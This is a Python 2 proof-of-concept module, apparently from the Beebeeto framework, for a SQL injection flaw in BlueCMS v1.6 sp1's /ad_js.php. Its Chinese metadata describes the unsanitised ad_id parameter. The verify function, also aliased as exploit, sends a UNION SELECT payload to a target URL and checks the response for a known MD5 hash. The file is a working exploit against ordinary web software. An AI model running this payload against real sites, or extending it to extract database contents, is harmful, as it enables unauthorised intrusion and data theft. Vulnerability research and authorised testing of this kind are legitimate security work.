#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0059',
            'name': 'BlueCMS v1.6 sp1 /ad_js.php SQL注入漏洞 POC',
            'author': 'tmp',
            'create_date': '2015-03-12',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'BlueCMS',
            'vul_version': ['1.6'],
            'type': 'SQL Injection',
            'tag': ['BlueCMS漏洞', 'SQL注入漏洞', '/ad_js.php', 'php'],
            'desc': '''
                    BlueCMS(地方分类信息门户专用CMS系统)
                    
                    $ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : ''; //根目录下其他文件都做了很好的过滤，
                    对数字型变量几乎都用了intval()做限制，唯独漏了这个文件，居然只是用了trim()去除头尾空格。
                    $ad = $db->getone("SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id); //直接代入查询。
                    ''',
            'references': ['http://www.myhack58.com/Article/html/3/7/2010/27774_2.htm',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = "/ad_js.php?ad_id=1%20and%201=2%20union%20select%201,2,3,4,5,md5(3.1415),md5(3.1415)"
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '63e1f04640e83605c1d177544a5a0488' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())